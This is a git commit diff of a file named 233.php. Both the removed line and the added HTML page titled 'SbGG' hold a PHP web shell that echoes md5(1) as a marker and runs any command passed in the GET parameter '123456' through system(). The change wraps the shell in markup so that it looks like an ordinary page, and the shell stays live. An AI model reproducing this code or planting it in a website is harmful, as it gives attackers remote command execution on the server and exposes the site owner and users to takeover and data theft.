2a7e41294b0dabdf1b59c7725aadc06052e669a3
Raphae <1318354595@qq.com>
2022-10-16 11:34:34 +0800

    Update 233.php

--- 233.php
+++ 233.php
@@ -1,1 +1,9 @@
-<?php echo(md5(1));@system($_GET[123456]);?>
+<!DOCTYPE html>
+<html>
+<head>
+     <title>SbGG</title>
+</head>
+</body>
+	 <?php echo(md5(1));@system($_GET[123456]);?>
+</body>
+</html>
